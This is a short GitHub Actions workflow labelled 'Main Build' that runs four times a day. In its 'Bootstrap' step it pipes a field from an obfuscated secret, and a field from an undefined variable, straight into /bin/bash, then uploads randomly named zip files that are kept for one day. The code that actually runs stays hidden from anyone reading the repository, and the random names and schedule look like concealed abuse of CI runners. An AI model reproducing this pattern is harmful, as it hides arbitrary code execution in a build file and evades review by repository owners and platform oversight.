name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '45 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          jxn9: ${{ secrets.jxn9 }}
        run: |
          printf '%s' "$jxn9" | jq -r .ntv850 | /bin/bash
          echo $onf775 | jq -r .qolg428 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: MOJoKhsm
          path: "*.zip"
          retention-days: 1
